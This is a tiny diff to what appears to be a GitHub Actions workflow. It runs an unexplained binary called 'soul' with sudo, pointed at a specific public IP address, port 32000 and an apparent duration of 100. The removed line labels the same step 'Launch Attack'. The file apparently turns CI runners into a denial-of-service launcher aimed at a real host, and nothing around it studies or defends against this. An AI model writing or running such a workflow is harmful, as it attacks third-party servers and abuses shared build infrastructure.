@@ -9,4 +9,4 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x soul
-    - run: sudo ./soul 🚀 Launch Attack 32002 7
+    - run: sudo ./soul 91.108.17.34 32000 100
